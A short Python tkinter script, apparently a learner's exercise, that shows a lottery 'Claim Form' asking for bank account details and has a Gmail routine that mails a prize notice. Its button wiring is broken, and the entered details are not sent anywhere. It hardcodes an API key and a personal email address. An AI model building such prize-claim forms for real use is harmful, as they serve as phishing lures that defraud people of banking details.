from tkinter import *
from tkinter import messagebox
from PIL import Image, ImageTk
import smtplib, ssl
import requests

root = Tk()
root.title("Claim Form.")
root.geometry("612x459")
root.config(bg="yellow")

img = Image.open("win.jpg")
render = ImageTk.PhotoImage(img)

img = Label(root, image=render)
img.image = render
img.place(x=0,y=0)

api_key = "5f5691e2d32d65dbfe9f9300"
username = "kamvelihle.buka2907@gmail.com"

r= requests.get("https://v6.exchangerate-api.com/v6/5f5691e2d32d65dbfe9f9300/latest/USD")
print(r.json())

bank_acc = Label(root, text = "Bank Account Number")
bank_acc.grid(column=1,row=2)

get_bank = Entry(root, width=15)
get_bank.grid(column=2,row=2)

acc_detail = Label(root, text = "Account Details")
acc_detail.grid(column=1,row=3)

get_det = Entry(root, width = 15)
get_det.grid(column=2,row=3)

banks = ['Capitec', 'ABSA', 'FNB','Standard Bank']
variable = StringVar(root)
variable.set(banks[0])

choose_bank = OptionMenu(root,variable,*banks)
choose_bank.config(height=1,width=6,font=('Arial',14))
choose_bank.grid(column=1,row=5)

def claim_prize():
    messagebox.showinfo("Notice","We have submitted your claim. Please check your e-mail for further instructions.")
    root.withdraw()
    import main

def mail_the_prize():
    port = 587
    smt_server = "smtp.gmail.com"
    server = smtplib.SMTP(smt_server,port)
    context = ssl.create_default_context()
    server.starttls(context=context)
    sender_email = "kamvelihle.buka2907@gmail.com"
    receiver_email = "kamvelihle.buka2907@gmail.com"
    password = input("Type your password and press enter:")
    server.login(sender_email, password)
    message = """\
Subject: Hi there.

The Lottery Board has processed your claim and is proud to announce that your prize has been allocated. Please check your inbox for an e-mail detailing the provision of your prize."""
    server.sendmail(sender_email, receiver_email, message)

claim = Button(root, text = "Claim Away!", width=10,command=lambda claim_prize:mail_the_prize)
claim.grid(column=1,row=6)

root.mainloop()
